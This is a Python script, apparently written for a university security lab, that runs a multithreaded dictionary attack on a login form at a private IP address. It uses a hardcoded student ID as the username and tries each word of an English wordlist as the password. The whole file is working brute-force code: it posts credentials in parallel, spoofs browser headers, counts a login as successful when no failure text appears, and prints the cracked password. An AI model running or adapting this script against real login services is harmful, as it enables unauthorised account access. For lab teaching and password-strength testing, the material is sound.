#!/usr/bin/env python3
"""
Dictionary attack!

Used ChatGPT for method formatting and control flow.
"""

import urllib.request
import http.cookiejar
from urllib.error import URLError, HTTPError
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
import threading
import argparse
import time
import sys

# Config
DARTMOUTH_ID = "f0071xt"
URL = "http://192.168.60.4:60/login"
WORDLIST_FILE = Path("english_words.txt")
UNAUTHORIZED_SNIPPET = "Unauthorized"  # adjust if your server uses different failure text
DEFAULT_WORKERS = 20
REQUEST_TIMEOUT = 5.0  # seconds

# Thread-local storage for per-thread Session
thread_local = threading.local()

def get_session():
    """Return a urllib opener (with cookiejar) bound to the current thread."""
    if getattr(thread_local, "opener", None) is None:
        cj = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        # set sensible headers similar to what the real client uses:
        opener.addheaders = [
            ("User-Agent", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0"),
            ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"),
            ("Accept-Language", "en-US,en;q=0.5"),
            ("Content-Type", "application/x-www-form-urlencoded"),
            ("Connection", "keep-alive"),
        ]
        thread_local.opener = opener
    return thread_local.opener

# Shared event to indicate a found password and allow workers to stop early
found_event = threading.Event()

FAIL_SNIPPETS = ["Login failed", "Invalid username or password", "Unauthorized"]

def try_password(password: str):
    """Worker: try one password, return (password, success_bool, response_text_snippet)."""
    if found_event.is_set():
        return None
    opener = get_session()
    data_dict = {"username": DARTMOUTH_ID, "password": password}
    encoded = urllib.parse.urlencode(data_dict).encode("utf-8")
    req = urllib.request.Request(URL, data=encoded, method="POST")
    # If you want to override headers per-request you can do:
    # for k, v in extra_headers.items(): req.add_header(k, v)

    try:
        with opener.open(req, timeout=REQUEST_TIMEOUT) as resp:
            raw = resp.read()
            try:
                text = raw.decode("utf-8", errors="ignore")
            except Exception:
                text = str(raw)
    except HTTPError as e:
        # HTTP errors come with a response body sometimes:
        try:
            body = e.read().decode("utf-8", errors="ignore")
        except Exception:
            body = ""
        return (password, False, f"HTTP_ERROR {e.code}: {e.reason}. Body: {body[:200]}")
    except URLError as e:
        return (password, False, f"REQUEST_ERROR: {e}")
    except Exception as e:
        return (password, False, f"UNKNOWN_ERROR: {e}")

    # success = response does NOT contain any failure phrases
    if not any(fail in text for fail in FAIL_SNIPPETS):
        found_event.set()
        return (password, True, text[:4000])
    return (password, False, text[:200])


def load_words(path: Path):
    if not path.exists():
        print(f"[!] Wordlist file not found: {path.resolve()}", file=sys.stderr)
        sys.exit(1)
    with path.open("r", encoding="utf-8", errors="ignore") as fh:
        return [line.strip() for line in fh if line.strip()]

def main():
    parser = argparse.ArgumentParser(description="Threaded local-lab password trial script")
    parser.add_argument("--workers", type=int, default=DEFAULT_WORKERS, help="Number of worker threads")
    parser.add_argument("--show-failed", action="store_true", help="Print failed attempts (verbose)")
    args = parser.parse_args()

    words = load_words(WORDLIST_FILE)
    total = len(words)
    print(f"[*] Loaded {total} passwords. Using {args.workers} workers.")
    start = time.time()

    with ThreadPoolExecutor(max_workers=args.workers) as exec:
        # Submit tasks lazily to allow early stopping
        futures = {exec.submit(try_password, pw): pw for pw in words}
        tried = 0
        for fut in as_completed(futures):
            tried += 1
            res = fut.result()
            if res is None:
                # worker saw found_event and exited early
                continue
            password, success, snippet = res
            if success:
                elapsed = time.time() - start
                print("\n[+] SUCCESS")
                print(f"    password: {password}")
                print(f"    elapsed: {elapsed:.2f}s, attempts: {tried}")
                print("    snippet of response (first 4000 chars):\n")
                print(snippet)
                break
            else:
                if args.show_failed:
                    print(f"[-] Failed: {password}")
        else:
            # loop finished without break -> no success
            print("[*] Done. No successful login found.")
    print(f"[*] Total time: {time.time() - start:.2f} s")

if __name__ == "__main__":
    main()
